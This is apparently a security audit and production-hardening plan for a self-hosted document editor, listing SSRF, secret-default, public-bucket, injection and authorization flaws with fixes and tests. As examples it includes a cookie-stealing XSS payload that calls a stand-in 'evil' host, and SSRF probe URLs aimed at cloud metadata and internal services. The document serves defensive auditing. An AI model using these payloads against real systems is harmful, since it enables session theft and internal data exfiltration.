# Security audit & production-readiness hardening plan

Static code review of the whole stack (Rust/axum backend, Python/FastAPI
converter microservice, Nuxt/Vue frontend, Docker Compose + nginx deployment)
with the goal of getting me-doc to production-ready. No live pentest/DAST was
run — this is a source-level review plus infra-config review. Findings are
ranked by severity; the task breakdown at the bottom is the trackable version
of this same list, in the same style as `tasks.md`.

Companion reading: `PRODUCT.md` (states a "privacy-first" positioning — several
findings below directly conflict with that claim), `README.md`'s "Known
limitations / debt" section (already tracks #10/#12/#20 as debt, confirmed and
sharpened here).

## Findings

### Critical

**1. SSRF in document export (image fetch)**
- Where: `backend/src/export/blocks.rs:365-399` (`fetch_images`), called from
  `backend/src/export/mod.rs:66-73`.
- Issue: exporting a page to DOCX/PDF makes the backend `GET` every image
  `src` found in the document, gated only by `url.starts_with("http://" | "https://")`.
  No host/IP allowlist or denylist.
- Impact: any Editor can put `![x](http://169.254.169.254/latest/meta-data/...)`
  or `http://minio:9000/...` / `http://backend:8080/health` / `http://postgres:5432`
  (any internal Docker service name) in a document, export it, and get the
  response bytes embedded back in their own downloaded file — SSRF with
  data exfiltration, from a "trusted enough to edit a doc" principal against
  the whole internal network, including cloud metadata endpoints if deployed
  on AWS/GCP/Azure.
- Fix direction: before fetching, resolve the URL's host and reject if it
  resolves to a loopback/link-local/private range (`10.0.0.0/8`,
  `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`) or
  matches a compose-internal service name (`postgres`, `redis`, `minio`,
  `backend`, `converter`, `mailpit`). Re-check after following redirects
  (the client already caps redirects at 5 — validate the *final* URL too, not
  just the first). Consider routing through a small egress allowlist instead
  of ad hoc checks if more outbound fetches get added later.

**2. JWT secrets silently default to `"dev-secret"`**
- Where: `backend/src/config.rs:48-49`.
- Issue: `JWT_ACCESS_SECRET`/`JWT_REFRESH_SECRET` fall back to the literal
  string `"dev-secret"` via `.unwrap_or_else(|_| "dev-secret".into())` if the
  env var is unset, instead of failing startup.
- Impact: a deployment that forgets to set these (easy to do — `.env.example`
  ships them, but nothing forces a real value) signs every access/refresh
  token with a public, known secret. Anyone can forge a JWT for any
  `user_id` — full authentication bypass.
- Fix direction: `env::var("JWT_ACCESS_SECRET")?` (bubble the error, no
  default) so the binary refuses to boot without a real secret. Same for
  `JWT_REFRESH_SECRET`. If a frictionless local-dev experience matters, gate
  the default behind an explicit `APP_ENV=dev` check rather than making it
  the unconditional fallback.

**3. Attachment/avatar bucket is anonymously public**
- Where: `docker-compose.yml:66-71` (`minio-createbuckets` service) /
  `scripts/init-minio.sh` run `mc anonymous set download local/$S3_BUCKET`.
- Issue: this sets the entire bucket to public, unauthenticated read. Every
  attachment and avatar is fetchable by anyone who has (or guesses/finds) its
  key — permanently, with zero relation to the page/workspace permission
  model. Revoking a share or deleting a user's access does nothing to the
  file.
- Impact: directly contradicts `PRODUCT.md`'s "user data is confined to the
  document owner ... not used, sold, or accessed by anyone else" claim.
  Object keys include a random UUID (`{workspace_id}/{uuid}-{filename}`), so
  this is "unguessable URL" security, not real access control — a leaked
  link (browser history, screen-share, referrer leakage, logs) means
  permanent public exposure.
- Fix direction: drop `mc anonymous set download`. Serve reads through an
  authenticated backend endpoint (`GET /attachments/:id` → checks
  `sharing::resolve_role` on the owning page, then streams from S3 or issues
  a short-lived presigned GET) instead of a public bucket. Avatars can stay
  simpler (lower sensitivity) but should still go through a signed, expiring
  URL rather than permanent public read.
- **Status: fixed.** `scripts/init-minio.sh`/`docker-compose.yml` no longer
  set the anonymous policy. Added `GET /attachments/download?key=` and
  `GET /auth/avatars/download?key=` (`backend/src/pages/mod.rs`,
  `backend/src/users/mod.rs`) which 302-redirect to a 5-minute presigned GET
  after checking access — `sharing::has_workspace_access` (new, in
  `sharing/mod.rs`) rather than `resolve_role`, since `attachments.page_id`
  is never actually populated in this codebase (always inserted `null`), so
  there's no specific page to resolve a role against; the check is "member of
  the owning workspace, or holds any active page/workspace grant or link
  token in it" instead. Auth for these two endpoints comes from the
  `refresh_token` cookie (peeked via new `tokens::peek_refresh_token`, not
  consumed) rather than a bearer/query token, because the URL is persisted
  inside document content — a `?token=<jwt>` would expire and permanently
  break the image once its 15-minute TTL passed. Frontend now builds these
  URLs via `resolveAttachmentUrl`/`resolveAvatarUrl`
  (`frontend/app/composables/useMediaUrl.ts`) instead of pointing
  `<img src>` straight at MinIO.
  **Known residual gap:** an anonymous public-link viewer (no account, no
  cookie) will see broken images/avatars — only the `link_token` fallback
  plumbing exists (`has_workspace_access` accepts one), but nothing in the
  frontend threads a link token into these specific URLs yet, since the
  persisted `src` is shared across all viewers and can't embed a per-viewer
  value. Fixing this fully needs a Tiptap image node view that resolves the
  URL per-render (appending the current viewer's link token) rather than a
  static string — left as follow-up work, not silently swept under the rug.
  **Operational note:** removing the anonymous policy from compose only
  prevents it on a *fresh* MinIO volume — a bucket that already had the
  policy applied (any existing deployment, including whatever dev/staging
  instance this ships to) keeps it until someone explicitly runs
  `mc anonymous set none local/<bucket>` against the running instance once.
  This is a required one-time migration step, not automatic.

### High

**4. Diagram export leaks document content to a third party**
- Where: `backend/src/export/blocks.rs:329-361` (`fetch_diagrams`).
- Issue: every Mermaid diagram's full source text is base64-encoded into a
  URL and sent to the public `mermaid.ink` service to render a PNG for
  PDF/DOCX export, on every export, unconditionally.
- Impact: private document content leaves the deployment to an external,
  uncontracted third party — contradicts the "data never leaves the
  operator's infrastructure" positioning, and creates an availability
  dependency (already flagged in-code as a `ponytail:` comment, but not
  treated as a privacy issue).
- Fix direction: either (a) self-host a Mermaid CLI/headless-render step in
  the `converter` service (already a Python sidecar; `mermaid-cli` needs
  Node+Chromium, which is more image weight, so weigh against actual usage),
  or (b) make outbound diagram rendering an explicit, off-by-default opt-in
  documented to the operator, or (c) skip image rendering in export and keep
  the current graceful text-fallback as the only behavior until a
  self-hosted renderer exists. Do not ship a "privacy-first" product that
  silently phones home document content on every export.

**5. Unsanitized filenames reach path-sensitive sinks**
- Where: `converter/main.py:36-39` (`tempfile.NamedTemporaryFile(suffix=Path(file.filename).suffix)`);
  `backend/src/pages/mod.rs:725` and `backend/src/users/mod.rs:127`
  (S3 keys built as `format!("{workspace_id}/{}-{}", Uuid::new_v4(), filename)`).
- Issue: the multipart `filename` is fully attacker-controlled (browsers let
  JS set it to anything) and flows unsanitized into (a) a `tempfile` suffix
  — Python's `tempfile` does not sanitize path separators out of `suffix`,
  so a crafted filename can influence where the temp file is written; and
  (b) S3 object keys, where `/`, `..`, control characters, or excessive
  length are all accepted verbatim.
- Impact: potential path traversal / unexpected file placement in the
  converter container; unpredictable/colliding S3 key structure.
- Fix direction: extract just the base filename (`Path::file_name()`
  equivalent, reject if it differs from the full string) and allowlist to
  `[A-Za-z0-9._-]` before use in both places; cap length; derive the
  extension from a small allowlist rather than trusting the client's claimed
  suffix wholesale.

**6. No content-type/extension allowlist on presigned uploads**
- Where: `presign_attachment` (`backend/src/pages/mod.rs:718-733`),
  `presign_avatar` (`backend/src/users/mod.rs:122-135`), both pass
  client-supplied `content_type` straight to `storage::presign_upload_url`.
- Impact: combined with #3 (public bucket), a user can presign an upload
  with `content_type: text/html` or `image/svg+xml` and host attacker-controlled
  HTML/script content on the MinIO origin — stored XSS on that origin
  (and a ready-made phishing host under the app's own object storage domain).
- Fix direction: allowlist expected MIME types per endpoint (images only for
  avatars; a broader-but-still-fixed list for attachments) and reject
  anything else before presigning. Independent of the #3 fix — do both.

**7. `markitdown[all]` maximizes untrusted-file attack surface**
- Where: `converter/requirements.txt:4`.
- Issue: `markitdown[all]` installs every optional extra — audio
  transcription, EXIF via `exiftool`, Azure Document Intelligence, YouTube
  transcript fetching, etc. — for a service whose entire job is converting
  fully untrusted, attacker-supplied files. Every extra parser (and any
  subprocess it shells out to, like `exiftool`) is additional attack surface
  for a memory-safety or command-injection bug in a third-party dependency
  processing hostile input.
- Fix direction: pin to only the extras the import feature actually needs
  (docx/pdf/pptx/xlsx/html/csv per the frontend's `accept` list — see
  `PageTree.vue`), e.g. `markitdown[pdf,docx,pptx,xlsx]`, dropping audio/EXIF/
  Azure/YouTube support entirely unless a real product need shows up.

**8. HTML injection in transactional emails**
- Where: `backend/src/email/mod.rs` (`share_html`, `otp_html`) interpolate
  `page_title` / `inviter_email` into raw HTML via `format!` with no
  escaping; `backend/src/auth/mod.rs:83-85`'s email validation
  (`!email.contains('@') || email.len() < 3`) does not reject `<`/`>`.
- Impact: a page titled `<img src=x onerror=fetch('https://evil/'+document.cookie)>`
  (or similar) shared with another user lands unescaped in that user's inbox
  HTML. Most webmail clients strip `<script>` but not all HTML/CSS-based
  vectors; at minimum this is HTML injection enabling phishing-quality
  spoofed content in a trusted-looking transactional email.
- Fix direction: HTML-escape `page_title`, `inviter_email`, and any other
  user-controlled value before interpolating into `share_html`/`otp_html`
  (a tiny escaping helper — replace `&`, `<`, `>`, `"`, `'` — is enough here,
  no need for a templating engine). Separately, tighten email validation to
  a real format check (a small regex or the `email_address` crate) rather
  than "contains an @ and is 3+ chars".

**9. Presigned uploads have no size limit**
- Where: `storage::presign_upload_url` (`backend/src/storage/mod.rs:41-58`) —
  no `content_length_range` condition on the presigned PUT.
- Impact: these uploads go browser→MinIO directly, never touching nginx or
  the backend, so nginx's `client_max_body_size 20m` and the backend's own
  `MAX_BYTES` (in `convert.rs`) never apply. A user can upload
  arbitrarily large files straight to storage — unbounded storage-abuse/DoS.
- Fix direction: set `content_length_range` (via
  `PresigningConfig`/policy conditions in the `aws-sdk-s3` presign call) to
  cap individual uploads (e.g. 25 MB for attachments, 5 MB for avatars).

**10. Cross-workspace page reparenting**
- Where: `create_page` (`backend/src/pages/mod.rs:193-224`) binds
  `body.parent_page_id` directly; `update_page`'s reparent path
  (`~396-439`) does the same via `case when $4 then $5 else parent_page_id end`.
  Both only call `require_membership` on the *target* `workspace_id`, never
  verifying the given parent page belongs to that workspace.
- Impact: a user could set `parent_page_id` to a page in a workspace they
  don't belong to (or don't have full rights on). `sharing::resolve_role`'s
  ancestor-walking recursive CTE (`backend/src/sharing/mod.rs:365-382`) then
  walks across that tenant boundary when resolving permissions for the new
  page — a data-model integrity gap with real cross-tenant IDOR potential.
- Fix direction: when a `parent_page_id` is supplied, look up its
  `workspace_id` and reject (400/403) if it doesn't match the target
  workspace, in both `create_page` and `update_page`.

### Medium

**11. No security headers**
- Where: `nginx/conf.d/default.conf`, `frontend/nuxt.config.ts` — neither
  sets CSP, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`,
  or `Strict-Transport-Security`.
- Fix direction: add headers at the nginx layer (single place, applies to
  both frontend and API responses): `X-Content-Type-Options: nosniff`,
  `X-Frame-Options: DENY` (or `frame-ancestors 'none'` via CSP),
  `Referrer-Policy: strict-origin-when-cross-origin`,
  `Strict-Transport-Security: max-age=...` (once real TLS is in place, #20),
  and a CSP scoped to the app's actual needs (self + the MinIO origin for
  images; note #4's fix removes the need to allowlist `mermaid.ink`).

**12. Inconsistent page-level authorization on destructive/copy operations**
- Where: `delete_page`, `duplicate_page`, `restore_page`, `list_trash`
  (`backend/src/pages/mod.rs`) all use `require_membership` (workspace-level)
  instead of the `PagePermission`/`resolve_role` gate (page-level) that
  `update_page`/`put_page_content`/export/comments use.
- Impact: any workspace member can delete or duplicate any page in the
  workspace regardless of that specific page's sharing grants, while an
  external Editor granted access to just that page (not a workspace member)
  is correctly blocked from delete/duplicate but can freely edit content —
  an inconsistent model that likely isn't the intended threat model for a
  product whose whole pitch is fine-grained page sharing.
- Fix direction: decide the intended policy explicitly (recommend: page-level
  Editor role, resolved the same way as `update_page`, should be sufficient
  for delete/duplicate/restore too — workspace membership is a coarser
  superset already implied by `resolve_role`'s fallback), then switch these
  four handlers to the `PagePermission` extractor for consistency.

**13. DB/cache/object-storage ports published to the host with weak default credentials**
- Where: `docker-compose.yml` — `postgres` (`5432`), `redis` (`6380`),
  `minio` (`9010`/`9011`) all have `ports:` mappings, with defaults
  `POSTGRES_PASSWORD=medoc`, `MINIO_ROOT_PASSWORD=minioadmin123`, and no
  Redis auth at all.
- Impact: the product's own operator persona ("anyone" self-hosting via
  Docker Compose, not expected to be an infra expert per `PRODUCT.md`) is
  likely to run this with defaults intact on a host with a public IP. That's
  direct, unauthenticated-or-trivially-authenticated access to the full
  database, cache, and object store.
- Fix direction: remove the `ports:` mappings for `postgres`/`redis`/`minio`
  in the production compose file (keep them only in a dev override, as
  `docker-compose.override.yml` already does for hot-reload) so they're only
  reachable on the compose-internal network; document that `nginx`/`backend`
  are the only services that need host exposure. Also make `POSTGRES_PASSWORD`/
  `MINIO_ROOT_PASSWORD` required (no default) in a documented production
  compose profile.

**14. Backend port bypasses the reverse proxy**
- Where: `docker-compose.yml:132-133` (`BACKEND_HOST_PORT:-8080` published
  alongside nginx's 443).
- Impact: direct access to the backend skips nginx's `X-Forwarded-For`
  setting, letting a client spoof that header directly against the backend
  and defeat `SmartIpKeyExtractor`'s per-client rate-limit bucketing
  (`backend/src/main.rs:42-45`) — undermines the login/OTP brute-force
  defense.
- Fix direction: same as #13 — don't publish the backend port in production;
  only nginx needs a host-facing port. If a direct `curl .../health` for
  container healthchecks is wanted, keep the Docker-internal healthcheck
  (already present) and drop the host port mapping.

**15. Refresh-token cookie lacks explicit `Secure`**
- Where: `backend/src/auth/mod.rs:264-270` sets `HttpOnly` + `SameSite=Lax`
  but never calls `.set_secure(true)`.
- Fix direction: add `cookie.set_secure(true)` explicitly — don't rely
  solely on nginx's HTTP→HTTPS redirect as the only thing preventing the
  cookie from ever being sent in plaintext.

**16. Thin security-relevant test coverage**
- Where: `backend/tests/permissions.rs` is the only integration test file,
  covering `resolve_role` alone. No tests for register/login/OTP flow,
  refresh-token rotation, rate limiting, the HTTP-layer permission gates
  (that `PagePermission`/`require_membership` actually reject at the router
  level), or any of the newer high-risk surfaces (import, export fetches, WS
  auth, presign).
- Fix direction: add integration tests alongside each Phase 0/1 fix (see
  Verification section) rather than a single after-the-fact test sprint —
  tracked per-task below.

### Low

**17. Minor user enumeration**
- `register` (`backend/src/auth/mod.rs:73-119`) returns a distinct
  `EmailTaken` (409) vs. generic validation errors; `login`'s password
  check only runs when the account exists, creating a timing difference.
  Low severity, standard trade-off — note only, fix if/when a stricter
  posture is wanted (generic "check your email" response + constant-time
  password step regardless of account existence).

**18. Assignee-email oracle in comments**
- `create_comment`'s `assignee_email` lookup (`backend/src/comments/mod.rs:145-158`)
  resolves any registered email with no membership/sharing check — lets any
  page contributor probe arbitrary emails for account existence. Low
  severity; fix by scoping the lookup to workspace members if/when
  assignment is restricted to members.

**19. Unused `chromium` install in backend image**
- `backend/Dockerfile` installs `chromium` (`CHROMIUM_PATH` env var) with
  zero references anywhere in `backend/src/` — dead weight from a
  superseded PDF-rendering approach (current export uses `genpdf`+`resvg`).
  Remove it: smaller image, less attack surface, faster builds.

**20. Dev TLS is self-signed**
- Already self-documented (`README.md:270`) as not for production. Needs a
  real certificate story (ACME/Let's Encrypt via `certbot` or a reverse
  proxy like Caddy/Traefik that automates it) before a public launch.

## Task breakdown

Numbered for tracking, grouped by phase. `blocked by` means don't start until
those task numbers are done.

### Phase 0 — Critical (blocks calling this production-ready)

- [x] **#1** Add SSRF guard (reject loopback/link-local/private/internal-service
      hosts, re-checked post-redirect) to `export::blocks::fetch_images` — *finding #1*
- [x] **#2** Make `JWT_ACCESS_SECRET`/`JWT_REFRESH_SECRET` required at startup
      (no default), fail closed — *finding #2*
- [x] **#3** Remove anonymous public-read bucket policy; add an authenticated
      attachment-read path — *finding #3*. **Existing deployments must also run
      `mc anonymous set none local/<bucket>` once against the live MinIO
      instance** — the compose change alone only affects a fresh volume.

### Phase 1 — High

- [x] **#4** Gate or remove third-party Mermaid rendering in export — shipped
      as an explicit opt-in (`EXPORT_DIAGRAM_RENDER_ENABLED`, default off),
      not removed — *finding #4*
- [x] **#5** Sanitize/allowlist filenames before use in the converter's
      tempfile suffix and in S3 key construction — *finding #5*
- [x] **#6** Add content-type allowlist to `presign_attachment`/`presign_avatar` — *finding #6*
- [x] **#7** Trim `markitdown[all]` to only the extras actually used — *finding #7*
- [x] **#8** HTML-escape interpolated values in `share_html`/`otp_html`;
      tighten email format validation in `register`/`login` — *finding #8*
- [x] **#9** Add a signed `Content-Length` (exact-size presign, checked
      against a cap before signing) to presigned upload URLs — *finding #9*
- [x] **#10** Validate `parent_page_id`'s workspace matches the target
      workspace in `create_page` and `update_page` — *finding #10*

### Phase 2 — Medium

- [x] **#11** Add security headers (CSP, X-Frame-Options, X-Content-Type-Options,
      Referrer-Policy, HSTS) at the nginx layer — *finding #11*. CSP uses
      `'unsafe-inline'` for script/style (the theme-flash-prevention inline
      script and Tailwind); tightening to a hash/nonce is a follow-up.
- [x] **#12** Applied consistent page-level authorization: `delete_page`,
      `duplicate_page`, `restore_page` now use `PagePermission`/`Role::Editor`
      instead of workspace membership. `list_trash` intentionally kept on
      `require_membership` — it's a workspace-wide listing with no single
      page to check a grant against — *finding #12*
- [x] **#13** Removed host `ports:` for postgres/redis/minio-console from the
      base compose file; restored via `docker-compose.override.yml` for local
      dev only (`docker compose -f docker-compose.yml up` = prod-safe, no
      dev override). MinIO's *API* port (9010) stays published in the base
      file — uploads/downloads go browser↔MinIO directly via presigned URLs,
      so it's load-bearing, not just a dev convenience — *finding #13*
- [x] **#14** Removed backend's host port mapping the same way (dev-only, via
      the override) — *finding #14*
- [x] **#15** Set `Secure` explicitly on the refresh-token cookie — *finding #15*
- [~] **#16** Added targeted tests alongside each fix (SSRF host-check unit
      tests, `sanitize_filename`, `is_valid_email`, `share_html` escaping,
      4 new `has_workspace_access` integration tests) — 21 unit + 7 integration
      tests all passing. Did **not** add full HTTP-router-level tests
      (spinning up the actual `axum::Router` with a mocked S3/email/redis
      `AppState`) or auth/OTP-flow/rate-limit tests — no existing harness for
      that in this repo, and building one is a bigger, separate effort than
      this pass — *finding #16, partially done*

### Phase 3 — Low / cleanup

- [ ] **#17** Register/login enumeration surface left as-is — accepted
      trade-off per the finding itself ("fix if/when a stricter posture is
      wanted"), not implemented — *finding #17*
- [x] **#18** Scoped `assignee_email` lookup to workspace members — *finding #18*
- [x] **#19** Removed unused `chromium` install from both `backend/Dockerfile`
      and `Dockerfile.dev` — *finding #19*
- [ ] **#20** Real TLS (ACME/Let's Encrypt) for production — ops/deployment
      task for whoever operates a given instance, not something to implement
      generically in this repo — *finding #20, note only, as scoped*

**Verified live**, not just compiled: rebuilt the backend three times during
this pass (`docker build`), ran the full test suite against a real Postgres
(`cargo test` — 21 + 7 tests, all passing), and smoke-tested end-to-end
against the actual running dev stack — register → OTP (via Mailpit) → verify
→ login all still work; security headers are live on the deployed nginx;
`/attachments/download` correctly returns 403 unauthenticated and 307
(redirect to a short presigned GET) with a valid session cookie; a direct,
unauthenticated request to the same object straight against MinIO now 403s
where it previously returned the file.

## Verification

- **#1 (SSRF)**: add a doc with `![x](http://169.254.169.254/)` and one with
  `http://minio:9000/...`, export to PDF/DOCX, confirm the fetch is rejected
  (image falls back to alt text) instead of the response being embedded.
  Add a unit test on the new host-check function covering loopback,
  RFC1918, link-local, and a resolved-via-DNS private IP.
- **#2 (JWT secret)**: run the backend with `JWT_ACCESS_SECRET` unset and
  confirm it exits non-zero at startup instead of listening.
- **#3 (public bucket)**: after removing the anonymous policy, `curl` a known
  attachment's direct MinIO URL unauthenticated and confirm it now 403/404s;
  confirm the new authenticated read path still serves the file to a user
  with page access.
- **#5/#6/#9 (upload hardening)**: attempt an upload with a path-traversal
  filename, a disallowed content-type, and an oversized body; confirm each
  is rejected before reaching storage.
- **#10 (cross-workspace reparent)**: attempt to create/reparent a page with
  a `parent_page_id` from a different workspace; confirm 400/403.
- **#12 (authorization consistency)**: as a page-level-shared Editor who is
  not a workspace member, attempt delete/duplicate; confirm the new expected
  behavior (allow or still-deny, per the decision made) is consistent with
  how `update_page` treats the same principal.
- **#13/#14 (port exposure)**: `docker compose up` the production config and
  confirm `nc -zv <host> 5432/6380/9010/9011/8080` all fail from outside the
  compose network, while the app still works end-to-end through nginx.
- **General**: `cargo test` (backend) and `docker compose exec backend cargo test`
  pass after each phase; add new tests alongside each fix rather than at the
  end.
